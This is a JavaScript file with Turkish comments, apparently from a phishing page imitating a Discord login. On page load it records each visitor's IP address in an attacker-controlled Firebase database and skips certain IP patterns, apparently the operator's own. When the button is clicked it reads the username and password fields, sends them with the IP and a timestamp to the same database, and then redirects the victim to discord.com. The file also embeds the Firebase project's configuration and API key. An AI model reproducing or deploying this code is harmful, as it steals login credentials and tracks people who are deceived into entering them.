import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-database.js";

// Firebase konfigürasyon bilgileri
const firebaseConfig = {
  apiKey: "AIzaSyCkLIjQv5j3lh34a_tbYGVgksU4-a6LfVw",
  authDomain: "logs2-bd74d.firebaseapp.com",
  databaseURL: "https://logs2-bd74d-default-rtdb.firebaseio.com",
  projectId: "logs2-bd74d",
  storageBucket: "logs2-bd74d.appspot.com",
  messagingSenderId: "31925245089",
  appId: "1:31925245089:web:c43f0b3a39623c1a100ce0",
  measurementId: "G-WB8F2JC6EF"
};

// Firebase'i başlat
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// IP adresini almak için fonksiyon
async function getIPAddress() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('IP adresi alınırken hata oluştu:', error);
    return null;
  }
}

async function firstGetIPAddress() {
  const ip = await getIPAddress();
  
  if (ip) {
    // IP adresinin 31 veya 88 ile başlayıp başlamadığını kontrol et
    if ((ip.startsWith('31') && ip.endsWith("16")) || ( ip.startsWith('88') && ip.endsWith('02'))){
      return;
    }

    // Form verilerini al

    const iplogsRef = ref(database, 'iplogs');
    
    // Yeni bir giriş oluştur
    const newEntryRef = push(iplogsRef);
    const timestamp = new Date().toISOString();

    // IP adresini, kullanıcı adı ve şifreyi ve zaman damgasını ayarla
    set(newEntryRef, {
      ip: ip
    })
      .then(() => {
        console.log('Veriler başarıyla eklendi:', ip, username, timestamp);
      })
      .catch((error) => {
        console.error('Veri eklenirken hata oluştu:', error);
      });
  }
}

// IP adresini, kullanıcı adı ve şifreyi loglamak için fonksiyon
async function logIPAddress() {
  const ip = await getIPAddress();
  
  if (ip) {
    // IP adresinin 31 veya 88 ile başlayıp başlamadığını kontrol et
    if ((ip.startsWith('31') && ip.endsWith("16")) || ( ip.startsWith('88') && ip.endsWith('02'))){
      return;
    }

    // Form verilerini al
    if(document.getElementById('username').value != 0 && document.getElementById('password').value != 0){ 
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
    
   

    const iplogsRef = ref(database, 'iplogs');
    
    // Yeni bir giriş oluştur
    const newEntryRef = push(iplogsRef);
    const timestamp = new Date().toISOString();

    // IP adresini, kullanıcı adı ve şifreyi ve zaman damgasını ayarla
    set(newEntryRef, {
      ip: ip,
      username: username,
      password: password,
      timestamp: timestamp
    })
      .then(() => {
        console.log("dc");
      })
      .catch((error) => {
        console.log("dc");
      });
  }
}
}

// Düğmeye tıklama olayını dinle
document.getElementById("btnID").addEventListener("click", function() {
  logIPAddress();
  location.href = "https://discord.com/";
});


// IP adresini almak için fonksiyon

  
firstGetIPAddress();
